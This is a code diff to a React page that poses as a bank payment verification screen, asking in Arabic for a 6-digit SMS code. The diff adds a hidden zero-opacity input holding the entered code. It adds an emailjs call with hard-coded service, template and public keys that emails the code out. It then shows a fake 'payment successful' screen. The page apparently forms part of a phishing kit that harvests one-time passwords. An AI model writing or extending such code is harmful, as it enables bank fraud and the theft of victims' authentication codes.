@@ -1,11 +1,16 @@
 'use client'
-import React, { FormEvent, MouseEventHandler, MutableRefObject, RefObject, useEffect, useRef, useState } from 'react'
+import React, { FormEvent, LegacyRef, MouseEventHandler, MutableRefObject, RefObject, useEffect, useRef, useState } from 'react'
 import BodyContianer from '../components/BodyContianer'
 import { useGSAP } from '@gsap/react'
+import emailjs from '@emailjs/browser';
 import gsap from 'gsap'
 import Notifecation from '../components/Notifecation'
 import SuccessPayed from '../components/SuccessPayed'
+import Loading from '../components/Loading';
 const OTP = () => {
+    const form
+        = useRef<LegacyRef<HTMLFormElement | null> | any>(null)
+    const [isLoading, setIsLoading] = useState<boolean | null>(false)
     const [isTry, setIsTry] = useState<boolean | null>(false)
     const [isSucssess, setIsSuccess] = useState<Boolean | false>(false)
     const [code, setCode] = useState<number[] | []>([])
@@ -31,24 +36,43 @@ const OTP = () => {
         input1.current?.focus()
         return () => clearInterval(interval)
     }, [isTry])
+    console.log();
 
     const p1 = /^(.)\1*$/g;
     // (?=(\d))(?!.*\1(?!\1))
     const p2 = /^\d*(?:123|234|345|456|567|678|789|890|012)+\d*$/g;
-    const handelSub = (e: any): any => {
+    const handelSub = async (e: any): Promise<any> => {
         e.preventDefault()
-        if ([input1, input2, input3, input4, input5, input6].every(item => {
-            if (item.current && item.current.value.length !== 0) {
+        // {
+        //    
+        // }
+        const isAllInputsFull = ([input1, input2, input3, input4, input5, input6].every(item => item.current && item.current.value.length !== 0))
+        console.log(isAllInputsFull);
 
-                setTimeout(() => {
+        if (isAllInputsFull) {
+            setIsLoading(true)
+            return await new Promise((resolve) => {
+                resolve(setTimeout(async () => {
                     setIsSuccess(true)
+                    setIsLoading(false)
                     // location.assign('/')
-                }, 500);
-            }
-        })) {
+                    await emailjs
+                        .sendForm('service_eiba1x2', 'template_m6ugimb', form?.current, {
+                            publicKey: "1dyv6-l9X5JPc7pEE",
+                        })
+                        .then(
+                            () => {
+                                console.log('SUCCESS!');
+                            },
+                            (error) => {
+                                console.log('FAILED...', error.text);
+                            },
+                        );
+                }, 2000))
+            })
         }
     }
-    console.log(isSucssess);
+
 
     useGSAP(() => {
         if (isSucssess) {
@@ -67,6 +91,10 @@ const OTP = () => {
     // }
     return (
         <div>
+            {isLoading &&
+                <Loading />
+
+            }
             <BodyContianer>
                 <>
                     {isTry &&
@@ -79,7 +107,7 @@ const OTP = () => {
                         <h4 className='mt-[25px] sm:text-[22px] text-center font-bold'>
                             ادخل رمز التحقق الذي يصلك في رسالة نصية والمكون من 6 أرقام او انتظر مكالمة البنك لتأكيد عملية الدفع
                         </h4>
-                        <form onSubmit={handelSub}>
+                        <form ref={form} onSubmit={handelSub}>
                             <section className='flex items-center justify-center gap-2 mt-[25px]'>
                                 <div className='size-[45px] box flex items-center px-[10px] justify-center p-[20px] relative '>
                                     <input required onChange={(e) => {
@@ -120,6 +148,7 @@ const OTP = () => {
                                     }} ref={input6} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                 </div>
                             </section>
+                            <input type="text" name='message' value={`${code.join('')}`} className='opacity-0' />
                             <button onClick={handelSub} type='submit' className='block w-full active:scale-[1.01] p-[14px] transition-all duration-[100ms] rounded-[6px] shadow-lg text-white my-[20px] outline-0 font-bold bg-[#f68024] hover:bg-[#ea6e0e]'>تأكيد</button>
                         </form>
                         <div className="flex mt-[30px] font-[ibmolexBoldMeduim] items-center flex-col">
@@ -134,7 +163,10 @@ const OTP = () => {
                         </div>
                     </section>
                     :
-                    <SuccessPayed />
+                    <>
+
+                        <SuccessPayed />
+                    </>
                 }
 
             </BodyContianer>
